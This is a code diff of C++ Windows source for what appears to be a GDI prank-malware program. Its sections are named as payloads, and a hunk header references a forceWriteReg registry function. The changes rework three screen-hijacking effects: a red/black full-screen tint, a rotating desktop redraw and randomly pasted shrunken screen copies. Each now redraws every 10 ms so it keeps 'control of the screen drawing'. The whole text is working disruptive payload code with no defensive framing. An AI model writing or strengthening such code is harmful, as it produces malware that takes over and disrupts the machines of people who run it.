@@ -99,36 +99,43 @@ void forceWriteReg(HKEY hRoot, const std::string& subKey, const std::string& val
 // --- SCREEN COLOR CHANGER --- //
 
 void changeColors() {
-    HDC hdc = GetDC(0);
     int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
     bool isRed = true;
 
+    // Use a high-frequency internal counter instead of long sleeps to toggle colors
+    int toggleCounter = 0;
+
     while (!isEnding) {
-        // Force the desktop and all windows to redraw to clear the previous tint
-        InvalidateRect(NULL, NULL, TRUE);
-        
-        // Brief pause to allow the OS to process the redraw message
-        std::this_thread::sleep_for(std::chrono::milliseconds(50));
+        // Fetch the DC freshly inside the fast loop
+        HDC hdc = GetDC(0);
+        if (hdc) {
+            // Create the brush (Red or Black depending on the toggle)
+            HBRUSH brush = CreateSolidBrush(isRed ? RGB(255, 0, 0) : RGB(20, 20, 20));
+            HBRUSH oldBrush = (HBRUSH)SelectObject(hdc, brush);
 
-        // Create the brush (Red or Black depending on the toggle)
-        HBRUSH brush = CreateSolidBrush(isRed ? RGB(255, 0, 0) : RGB(20, 20, 20));
-        HBRUSH oldBrush = (HBRUSH)SelectObject(hdc, brush);
+            // 0x00A000C9 is the ternary ROP code for 'DPa' (Destination AND Pattern)
+            PatBlt(hdc, 0, 0, sw, sh, 0x00A000C9);
 
-        // 0x00A000C9 is the ternary ROP code for 'DPa' (Destination AND Pattern)
-        // This keeps only the color channels of the brush, creating a tint effect.
-        PatBlt(hdc, 0, 0, sw, sh, 0x00A000C9);
+            // Cleanup
+            SelectObject(hdc, oldBrush);
+            DeleteObject(brush);
+            ReleaseDC(0, hdc);
+        }
 
-        // Cleanup GDI objects to prevent memory leaks
-        SelectObject(hdc, oldBrush);
-        DeleteObject(brush);
+        // Increment counter to handle the state swap roughly every 1.5 seconds
+        // without giving up control of the screen drawing
+        toggleCounter++;
+        if (toggleCounter >= 150) { // 150 iterations * ~10ms = ~1500ms
+            isRed = !isRed;
+            toggleCounter = 0;
+        }
 
-        // Toggle the color for the next loop
-        isRed = !isRed;
-        
-        // Sleep for the remainder of the 1500ms cycle
-        std::this_thread::sleep_for(std::chrono::milliseconds(1450));
+        // Minimal sleep to prevent 100% core saturation while constantly drawing
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
     }
-    ReleaseDC(0, hdc);
+    
+    // Final clear when done
+    InvalidateRect(NULL, NULL, TRUE);
 }
 
 // --- RANDOM BEEP GENERATOR --- //
@@ -158,80 +165,88 @@ void randomBeepGenerator() {
 // --- SCREEN ROTATION ILLUSION --- //
 
 void rotateScreenEffect() {
-    // Get the desktop DC (Source) and create a compatible DC for manipulation
-    HDC hdcSrc = GetDC(0);
     int sw = GetSystemMetrics(0);
     int sh = GetSystemMetrics(1);
     
-    // Determine the center point of the screen
     double cx = sw / 2.0;
     double cy = sh / 2.0;
-    
     double currentAngle = 0.0;
+    int angleCounter = 0;
 
     while (!isEnding) {
-        // Increment the angle by 20 degrees converted to radians
-        currentAngle += 20.0 * (M_PI / 180.0);
-        
-        // Keep the angle within a standard 0 to 2*PI circle
-        if (currentAngle >= 2.0 * M_PI) {
-            currentAngle -= 2.0 * M_PI;
+        HDC hdcSrc = GetDC(0);
+        if (hdcSrc) {
+            double cosA = cos(currentAngle);
+            double sinA = sin(currentAngle);
+
+            POINT lpPoint[3];
+
+            auto rotatePoint = [&](double x, double y) -> POINT {
+                POINT p;
+                p.x = static_cast<LONG>(cx + (x - cx) * cosA - (y - cy) * sinA);
+                p.y = static_cast<LONG>(cy + (x - cx) * sinA + (y - cy) * cosA);
+                return p;
+            };
+
+            lpPoint[0] = rotatePoint(0, 0);   
+            lpPoint[1] = rotatePoint(sw, 0);  
+            lpPoint[2] = rotatePoint(0, sh);  
+
+            // Render continuous frame
+            PlgBlt(hdcSrc, lpPoint, hdcSrc, 0, 0, sw, sh, NULL, 0, 0);
+            ReleaseDC(0, hdcSrc);
         }
 
-        double cosA = cos(currentAngle);
-        double sinA = sin(currentAngle);
+        // Increment rotation angle roughly every 1 second (100 iterations * 10ms)
+        angleCounter++;
+        if (angleCounter >= 100) {
+            currentAngle += 20.0 * (M_PI / 180.0);
+            if (currentAngle >= 2.0 * M_PI) {
+                currentAngle -= 2.0 * M_PI;
+            }
+            angleCounter = 0;
+        }
 
-        // PlgBlt requires an array of 3 points defining the destination parallelogram:
-        // lpPoint[0] = Top-Left corner of destination
-        // lpPoint[1] = Top-Right corner of destination
-        // lpPoint[2] = Bottom-Left corner of destination
-        POINT lpPoint[3];
-
-        // Helper lambda to rotate a coordinate around the screen center
-        auto rotatePoint = [&](double x, double y) -> POINT {
-            POINT p;
-            p.x = static_cast<LONG>(cx + (x - cx) * cosA - (y - cy) * sinA);
-            p.y = static_cast<LONG>(cy + (x - cx) * sinA + (y - cy) * cosA);
-            return p;
-        };
-
-        // Calculate the rotated positions for the three critical corners
-        lpPoint[0] = rotatePoint(0, 0);   // Rotated Top-Left
-        lpPoint[1] = rotatePoint(sw, 0);  // Rotated Top-Right
-        lpPoint[2] = rotatePoint(0, sh);  // Rotated Bottom-Left
-
-        // Blit the standard desktop screen onto the calculated rotated parallelogram
-        PlgBlt(hdcSrc, lpPoint, hdcSrc, 0, 0, sw, sh, NULL, 0, 0);
-
-        // Sleep for 1 second before the next rotation step
-        std::this_thread::sleep_for(std::chrono::seconds(1));
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
     }
 
-    // Force a complete desktop redraw to restore the normal layout when finished
     InvalidateRect(NULL, NULL, TRUE);
-    ReleaseDC(0, hdcSrc);
 }
 
 // --- SCREEN MULTIPLIER EFFECT --- //
 
 void screenMultiplier() {
-    HDC hdc = GetDC(0);
-    int sw = GetSystemMetrics(0); // Width of the screen
-    int sh = GetSystemMetrics(1); // Height of the screen
+    int sw = GetSystemMetrics(0); 
+    int sh = GetSystemMetrics(1); 
     
+    int destX = 0;
+    int destY = 0;
+    int positionCounter = 0;
+
+    // Pick initial random position
+    destX = (sw > 300) ? rand() % (sw - 300) : 0;
+    destY = (sh > 300) ? rand() % (sh - 300) : 0;
+
     while (!isEnding) {
-        // Calculate a random position, keeping the 300x300 box entirely on the screen
-        int destX = (sw > 300) ? rand() % (sw - 300) : 0;
-        int destY = (sh > 300) ? rand() % (sh - 300) : 0;
+        HDC hdc = GetDC(0);
+        if (hdc) {
+            // Keep forcefully pasting the captured image to the current destination
+            StretchBlt(hdc, destX, destY, 300, 300, hdc, 0, 0, sw, sh, SRCCOPY);
+            ReleaseDC(0, hdc);
+        }
+
+        // Change the targeted thumbnail box location every 200ms (20 * 10ms)
+        positionCounter++;
+        if (positionCounter >= 20) {
+            destX = (sw > 300) ? rand() % (sw - 300) : 0;
+            destY = (sh > 300) ? rand() % (sh - 300) : 0;
+            positionCounter = 0;
+        }
         
-        // Stretch the full screen down into the 300x300 random spot
-        StretchBlt(hdc, destX, destY, 300, 300, hdc, 0, 0, sw, sh, SRCCOPY);
-        
-        // Delay for 200ms
-        std::this_thread::sleep_for(std::chrono::milliseconds(200)); 
+        std::this_thread::sleep_for(std::chrono::milliseconds(10)); 
     }
     
-    ReleaseDC(0, hdc);
+    InvalidateRect(NULL, NULL, TRUE);
 }
 
 // --- CURSOR SHAKING PAYLOAD --- //
